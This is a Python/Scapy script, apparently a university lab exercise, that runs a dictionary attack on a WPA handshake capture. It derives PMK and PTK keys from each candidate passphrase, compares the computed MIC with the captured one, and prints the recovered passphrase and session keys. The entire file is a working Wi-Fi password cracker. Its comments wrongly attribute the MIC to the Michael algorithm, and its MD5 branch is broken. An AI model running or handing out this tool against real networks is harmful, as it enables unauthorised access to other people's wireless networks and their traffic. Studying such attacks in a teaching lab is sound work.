#!/usr/bin/env python
#-*- coding: utf-8 -*-
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
#  Authors : Yimnaing Kamdem && Siu Aurelien
#  Objectif: Développer un script en Python/Scapy capable de Lire une passphrase à partir d’un fichier (wordlist)
#            Dériver les clés à partir de la passphrase,Récupérer le MIC du dernier message du 4-way handshake dans         
#            la capture. calculer le MIC du dernier message du 4-way handshake à l’aide de l’algorithme Michael.
#            Comparer les deux MIC.
#
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array

import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+ str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A  = "Pairwise key expansion" #this string is used in the pseudo-random function

# All of them can be seen with : wpa.show() and obtained from the frame 0, 1, and 3.
ssid      = wpa[3].info
APmac     = a2b_hex(wpa[0].addr2.replace(":","")) 
Clientmac = a2b_hex(wpa[1].addr1.replace(":","")) 


# Authenticator and Supplicant Nonces
# They can be found in the 4-way handshake frames
# wpa[5] = first frame of the handshake, contains the Authenticator nonce in [13:45]
# wpa[6] = second frame of the handshake, contains the Supplicant nonce in [13:45]
# wpa[8] = fourth frame of the handshake, contains the mic to test in [154:186]

ANonce = wpa[5].load[13:45] 
SNonce = wpa[6].load[13:45]


# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test =  b2a_hex(wpa[8].load)[154:186] 
B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
data        = a2b_hex(scapy.utils.linehexdump(wpa[8][EAPOL], 0, 1, True).replace(" ", "").lower().replace( str(mic_to_test), "0" * len(mic_to_test)))


with open('dico.txt') as f:

    for passPhrase in f:
        if(passPhrase[-1] == '\n'):
            passPhrase = passPhrase[:-1]

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk, str.encode(A), B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        if ((wpa[5].load[2] & 0b111)== 2) :

             mic = hmac.new(ptk[0:16],data,hashlib.sha1)
        else:
             mic = hashlib.md5

        # We remove the icv, because it's not relevant for the attack.
        if(mic.hexdigest()[:-8] == mic_to_test):
            print ("\n\nValues used to derivate keys")
            print ("============================")
            print ("Passphrase: ",passPhrase)
            print ("SSID: ",ssid)
            print ("AP Mac: ",b2a_hex(APmac))
            print ("CLient Mac: ",b2a_hex(Clientmac))
            print ("AP Nonce: ",b2a_hex(ANonce))
            print ("Client Nonce: ",b2a_hex(SNonce), "\n")


            print ("\nResults of the key expansion")
            print ("=============================")
            print ("PMK:\t\t",pmk)
            print ("PTK:\t\t",b2a_hex(ptk))
            print ("KCK:\t\t",b2a_hex(ptk[0:16]))
            print ("KEK:\t\t",b2a_hex(ptk[16:32]))
            print ("TK:\t\t",b2a_hex(ptk[32:48]))
            print ("MICK:\t\t",b2a_hex(ptk[48:64]))
            print ("MIC:\t\t",mic.hexdigest())

            break